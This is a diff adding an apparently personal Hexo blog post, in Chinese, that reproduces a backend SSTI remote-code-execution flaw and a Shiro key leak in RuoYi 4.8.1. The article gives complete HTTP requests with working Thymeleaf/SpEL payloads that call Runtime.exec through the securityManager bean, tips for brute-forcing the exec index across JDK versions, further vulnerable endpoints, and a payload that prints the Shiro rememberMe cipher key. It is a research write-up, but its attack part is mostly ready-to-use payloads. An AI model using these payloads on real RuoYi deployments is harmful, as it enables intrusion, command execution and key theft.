@@ -1,0 +1,798 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/candy.png">
+  <link rel="icon" href="/img/candy.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#1b1b26">
+  <meta name="author" content="Candy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SSTI 注入 RCE漏洞复现 jdk8u152（据作者所说当 jdk8u300+后盖 ssti 注入 rce 漏洞无法实现）  12345678910111213141516171819202122POST &#x2F;monitor&#x2F;cache&#x2F;getNames HTTP&#x2F;1.1Host: localhostContent-Length: 360sec-ch-ua-platform: &quot;Win">
+<meta property="og:type" content="article">
+<meta property="og:title" content="若依4.8.1 后台SSTI注入RCE和泄露ShiroKey漏洞复现">
+<meta property="og:url" content="http://candyb0x.github.io/2025/12/05/%E8%8B%A5%E4%BE%9D4-8-1-%E5%90%8E%E5%8F%B0SSTI%E6%B3%A8%E5%85%A5RCE%E5%92%8C%E6%B3%84%E9%9C%B2ShiroKey%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Welcome Candy Box">
+<meta property="og:description" content="SSTI 注入 RCE漏洞复现 jdk8u152（据作者所说当 jdk8u300+后盖 ssti 注入 rce 漏洞无法实现）  12345678910111213141516171819202122POST &#x2F;monitor&#x2F;cache&#x2F;getNames HTTP&#x2F;1.1Host: localhostContent-Length: 360sec-ch-ua-platform: &quot;Win">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764927775374-30e32e81-4c55-4537-8559-3375dc3365c5.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764928376120-34602bce-f47a-4b14-8ce6-852b39618571.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764928359901-fbda802b-04e9-4ea3-83f4-720d02c4d834.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764928132421-e9582f80-6dc0-441d-a9ed-0d1e130acd97.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764946519214-5877dccc-3e20-4e40-87af-5b0ebf01a4e1.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764946546919-7d06d50f-9ff5-4ffa-b1f4-c4e3446f7247.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764946592567-86a064a3-7472-4fda-89c6-91aebbb79079.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764927496680-90e8d60d-5f88-468e-a708-c9922866b94b.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764927486818-08ea66a8-9cb6-428c-a9a5-e383fc39d32c.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764927564775-fd239eea-1c9a-4102-ab2a-82fc4018e727.png">
+<meta property="article:published_time" content="2025-12-05T15:16:42.000Z">
+<meta property="article:modified_time" content="2025-12-24T13:47:16.909Z">
+<meta property="article:author" content="Candy">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="若依">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="ruoyi">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764927775374-30e32e81-4c55-4537-8559-3375dc3365c5.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>若依4.8.1 后台SSTI注入RCE和泄露ShiroKey漏洞复现 - Welcome Candy Box</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"candyb0x.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Candy</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/essay/" target="_self">
+                <i class="iconfont icon-note"></i>
+                <span>随笔</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Bannerimg.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="若依4.8.1 后台SSTI注入RCE和泄露ShiroKey漏洞复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Candy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-05 23:16" pubdate>
+          2025年12月5日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">若依4.8.1 后台SSTI注入RCE和泄露ShiroKey漏洞复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SSTI-注入-RCE"><a href="#SSTI-注入-RCE" class="headerlink" title="SSTI 注入 RCE"></a>SSTI 注入 RCE</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul>
+<li>jdk8u152（据作者所说当 jdk8u300+后盖 ssti 注入 rce 漏洞无法实现）</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/monitor/cache/getNames</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>360<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">X-CSRF-Token</span><span class="hljs-punctuation">: </span>NvGDcXsqxAZ3sO19ckQ7j0fSjEibDHcKoY7pCBAaCE4=<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not?A_Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;130&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/monitor/cache<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=605f03e0-f44b-4d92-a50d-13aa65ada551<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-routeros"><span class="hljs-attribute">fragment</span>=__|$$&#123;#response.getWriter().<span class="hljs-built_in">print</span>(@securityManager.getClass().getClassLoader().loadClass(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethods.?[<span class="hljs-attribute">name</span>==&#x27;getRuntime&#x27;][0].invoke(<span class="hljs-literal">null</span>).getClass.getMethods.?[<span class="hljs-attribute">name</span>==&#x27;exec&#x27;][0].invoke(@securityManager.getClass().getClassLoader().loadClass(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethods.?[<span class="hljs-attribute">name</span>==&#x27;getRuntime&#x27;][0].invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&#x27;calc&#x27;</span>,<span class="hljs-literal">null</span>))&#125;|__::.x</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764927775374-30e32e81-4c55-4537-8559-3375dc3365c5.png" srcset="/img/loading.gif" lazyload></p>
+<p>上述的复现环境是在 jdk8u152 中进行的，据说该 rce 漏洞能够给在 jdk11、jdk17、jdk22 等环境中实现</p>
+<ul>
+<li>jdk17.0.7</li>
+</ul>
+<p>不同的 jdk 大版本的 exec 方法的位置可能不同，可以通过爆破的方法获取争取的位置，例如下面的 jdk17 的 exec 方法所在的索引就是<code>2</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764928376120-34602bce-f47a-4b14-8ce6-852b39618571.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764928359901-fbda802b-04e9-4ea3-83f4-720d02c4d834.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/monitor/cache/getNames</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>360<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">X-CSRF-Token</span><span class="hljs-punctuation">: </span>MPmE+4uByjsUC+uvQTJa91ZbsKQZoXCWCjSlrWaI5sc=<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not?A_Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;130&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/monitor/cache<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=bfb93594-8c4d-4b40-9469-dd30c0226048<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-routeros"><span class="hljs-attribute">fragment</span>=__|$$&#123;#response.getWriter().<span class="hljs-built_in">print</span>(@securityManager.getClass().getClassLoader().loadClass(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethods.?[<span class="hljs-attribute">name</span>==&#x27;getRuntime&#x27;][0].invoke(<span class="hljs-literal">null</span>).getClass.getMethods.?[<span class="hljs-attribute">name</span>==&#x27;exec&#x27;][2].invoke(@securityManager.getClass().getClassLoader().loadClass(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethods.?[<span class="hljs-attribute">name</span>==&#x27;getRuntime&#x27;][0].invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&#x27;calc&#x27;</span>,<span class="hljs-literal">null</span>))&#125;|__::.x</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764928132421-e9582f80-6dc0-441d-a9ed-0d1e130acd97.png" srcset="/img/loading.gif" lazyload></p>
+<p>除了参考文章中的接口<code>/monitor/cache/getNames</code>，其他包含 SSTI 注入的接口也一样可以打通这个漏洞，例如以下的接口：</p>
+<ol>
+<li><code>/monitor/cache/getKeys</code></li>
+<li><code>/monitor/cache/getValue</code></li>
+<li><code>/demo/form/localrefresh/task</code></li>
+</ol>
+<p>对于<code>/monitor/cache/getKeys</code>和<code>/monitor/cache/getValue</code>需要包含有效的<code>缓存名</code>才能够正确打通 payload，<code>/demo/form/localrefresh/task</code>则不需要，系统默认存在的缓存名如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764946519214-5877dccc-3e20-4e40-87af-5b0ebf01a4e1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764946546919-7d06d50f-9ff5-4ffa-b1f4-c4e3446f7247.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764946592567-86a064a3-7472-4fda-89c6-91aebbb79079.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在 <strong>Thymeleaf 3.0.12</strong> 及以上版本中，<code>SpringStandardExpressionUtils</code> 类引入了更严格的检查机制（如 <code>containsSpELInstantiationOrStatic</code> 或其后续演进版本 <code>containsSpELInstantiationOrStaticOrParam</code>）。</p>
+<p>该检查明确禁止了以下 SpEL（Spring Expression Language）语法：</p>
+<ol>
+<li><strong>静态类型引用</strong>：<code>T(java.lang.Runtime)</code> —— 禁止直接调用静态类。</li>
+<li><strong>对象实例化</strong>：<code>new java.io.File(...)</code> —— 禁止使用 <code>new</code> 关键字创建对象。</li>
+<li><strong>参数引用</strong>：禁止访问 <code>param</code> 对象。</li>
+</ol>
+<p>因此，之前常见的 Payload（如 <code>$&#123;T(java.lang.Runtime).getRuntime().exec(...)&#125;</code>）会直接报错，被拦截。</p>
+<p>既然不能“凭空”创建对象（不能用 <code>new</code>）也不能“直接”引用类（不能用 <code>T()</code>），攻击者需要寻找一个<strong>已经存在于 Spring 上下文中</strong>的对象作为切入点。</p>
+<p><strong>思路如下：</strong></p>
+<ol>
+<li><strong>利用 Spring Bean</strong>：Thymeleaf 允许通过 <code>@beanName</code> 的语法直接访问 Spring 容器中管理的 Bean。这是合法的语法，不会被安全检查拦截。</li>
+<li><strong>寻找目标 Bean</strong>：RuoYi 集成了 Shiro，因此容器中必然存在名为 <code>securityManager</code> 的 Bean。</li>
+<li><strong>链式反射调用</strong>：一旦获取了一个 Java 对象（Bean），就可以通过标准的 Java 方法调用链（反射）来“顺藤摸瓜”：<ul>
+<li><code>对象.getClass()</code> -&gt; 获取 Class 对象。</li>
+<li><code>Class.forName(...)</code> -&gt; 加载任意类（如 <code>java.lang.Runtime</code>）。</li>
+<li><code>getMethod(...)</code> -&gt; 获取方法。</li>
+<li><code>invoke(...)</code> -&gt; 执行方法。</li>
+</ul>
+</li>
+</ol>
+<p><strong>总结：绕过的核心在于用“已有的 Bean 对象 + 反射链式调用”替代了被禁用的“静态类引用 + 构造函数”。</strong></p>
+<p>为了执行命令，我们需要获取 <code>Runtime.getRuntime().exec()</code>。</p>
+<p><strong>构造步骤：</strong></p>
+<ol>
+<li><strong>入口</strong>：使用 <code>@securityManager</code>。</li>
+<li><strong>加载类</strong>：通过 <code>@securityManager.getClass().forName(&quot;java.lang.Runtime&quot;)</code> 来加载 Runtime 类。</li>
+<li><strong>获取方法</strong>：使用 SpEL 的集合选择语法 <code>.getMethods().?[name==&#39;getRuntime&#39;][0]</code> 筛选出 <code>getRuntime</code> 方法。</li>
+<li><strong>实例化</strong>：调用 <code>invoke(null)</code> 获取 Runtime 实例。</li>
+<li><strong>执行命令</strong>：再次获取 <code>exec</code> 方法并调用。</li>
+</ol>
+<p><strong>最终 Payload (jdk8u152):</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">__|$$&#123;#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass(&#x27;java.lang.Runtime&#x27;).getMethods.?[name==&#x27;getRuntime&#x27;][0].invoke(null).getClass.getMethods.?[name==&#x27;exec&#x27;][0].invoke(@securityManager.getClass().getClassLoader().loadClass(&#x27;java.lang.Runtime&#x27;).getMethods.?[name==&#x27;getRuntime&#x27;][0].invoke(null),&#x27;calc&#x27;,null))&#125;|__::.x<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：<code>exec</code> 方法在 <code>getMethods()</code> 返回数组中的索引（如 <code>[0]</code>）可能随 JDK 版本不同而变化，攻击时可能需要爆破该索引（0-5）。</p>
+</blockquote>
+<h1 id="SSTI-注入获取-ShiroKey"><a href="#SSTI-注入获取-ShiroKey" class="headerlink" title="SSTI 注入获取 ShiroKey"></a>SSTI 注入获取 ShiroKey</h1><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/monitor/cache/getNames</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>205<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">X-CSRF-Token</span><span class="hljs-punctuation">: </span>NvGDcXsqxAZ3sO19ckQ7j0fSjEibDHcKoY7pCBAaCE4=<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not?A_Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;130&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/monitor/cache<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=605f03e0-f44b-4d92-a50d-13aa65ada551<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-routeros"><span class="hljs-attribute">fragment</span>=__|$$&#123;#response.getWriter().<span class="hljs-built_in">print</span>(@securityManager.getClass().forName(<span class="hljs-string">&#x27;java.util.Base64&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getEncoder&#x27;</span>).invoke(<span class="hljs-literal">null</span>).encodeToString(@securityManager.rememberMeManager.cipherKey))&#125;|__::.x</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764927496680-90e8d60d-5f88-468e-a708-c9922866b94b.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764927486818-08ea66a8-9cb6-428c-a9a5-e383fc39d32c.png" srcset="/img/loading.gif" lazyload></p>
+<p>最新版 4.8.1 的 Ruoyi 框架在笨死并没有包含任何利用连的依赖，所以就算爆破所有的利用链也依旧无法利用执行命令。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1764927564775-fd239eea-1c9a-4102-ab2a-82fc4018e727.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该漏洞的原理是基于 SSTI 注入 RCE 的延申，但是其危害在我看来并不大，根本原因在于，只要部署的若依没有对依赖进行修改和添加，就算获取了 shirokey，也没有办法找到有效的利用链实现 RCE。</p>
